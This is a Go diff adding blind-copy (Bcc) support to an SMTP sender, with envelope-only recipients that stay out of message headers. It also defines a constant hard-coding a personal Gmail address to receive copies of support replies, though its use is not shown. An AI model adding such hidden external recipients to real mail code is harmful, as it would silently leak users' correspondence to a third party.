@@ -19,6 +19,9 @@ import (
 
 type Message struct {
 	To string
+	// Bcc contains blind-copy recipients. Addresses are added to the SMTP
+	// envelope only and never appear in the message headers.
+	Bcc []string
 	// Subject is RFC 2047 encoded automatically when it contains non-ASCII
 	// text; an unencoded 8-bit Subject has been observed making at least one
 	// real *.edu.tw gateway demand SMTPUTF8 and hard-bounce when the next hop
@@ -45,6 +48,10 @@ type Message struct {
 	// msg-id, angle brackets included.
 	InReplyTo string
 }
+
+// SupportArchiveBCCAddress receives copies of human support replies and is
+// intentionally not attached to automated account-security messages.
+const SupportArchiveBCCAddress = "zengcode0315@gmail.com"
 
 type Sender interface {
 	Send(context.Context, Message) error
@@ -99,6 +106,20 @@ func (s *SMTPSender) Send(ctx context.Context, message Message) error {
 	to, err := parseMailbox(message.To)
 	if err != nil {
 		return fmt.Errorf("recipient address is invalid: %w", err)
+	}
+	bccRecipients := make([]string, 0, len(message.Bcc))
+	seenRecipients := map[string]struct{}{strings.ToLower(to): {}}
+	for _, rawAddress := range message.Bcc {
+		bccAddress, parseErr := parseMailbox(rawAddress)
+		if parseErr != nil {
+			return fmt.Errorf("blind-copy recipient address is invalid: %w", parseErr)
+		}
+		key := strings.ToLower(bccAddress)
+		if _, duplicate := seenRecipients[key]; duplicate {
+			continue
+		}
+		seenRecipients[key] = struct{}{}
+		bccRecipients = append(bccRecipients, bccAddress)
 	}
 	from, err := parseMailbox(s.config.From)
 	if err != nil {
@@ -158,6 +179,11 @@ func (s *SMTPSender) Send(ctx context.Context, message Message) error {
 	}
 	if err := client.Rcpt(to); err != nil {
 		return fmt.Errorf("set SMTP recipient: %w", err)
+	}
+	for _, bccAddress := range bccRecipients {
+		if err := client.Rcpt(bccAddress); err != nil {
+			return fmt.Errorf("set SMTP blind-copy recipient: %w", err)
+		}
 	}
 	writer, err := client.Data()
 	if err != nil {
